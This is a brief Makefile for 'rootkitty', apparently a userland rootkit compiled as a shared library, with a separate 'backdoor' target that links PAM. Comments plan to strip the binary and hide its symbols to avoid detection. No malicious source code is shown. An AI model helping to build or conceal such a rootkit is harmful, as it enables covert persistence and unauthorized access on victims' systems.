CC = gcc
SRCS = src/rootkitty-lib.c 
OUT = rootkitty.so
# add -s later for a stripped binary
# add -fvisibility=hidden for hidden symbols
# (perhaps use optimisation) -Os -> smaller code -funroll-loops -> longer code 
CFLAGS = -fPIC -shared -lssl -ldl 
DBG = $(CFLAGS) -Wall -Wextra -g -O2

all:
	@echo "Compiling rootkitty... >^..^<"
	$(CC) $(SRCS) -o $(OUT) $(CFLAGS) $(LIBS)

# for debugging purposes
debug:
	@echo "Compiling rootkitty + debug...  >^..^<"
	$(CC) $(SRCS) -o $(OUT) $(DBG)

# temporary one for backdoor (will be moved to "all" later)
backdoor:
	$(CC) $(SRCS) -o $(OUT) -lpam $(CFLAGS)
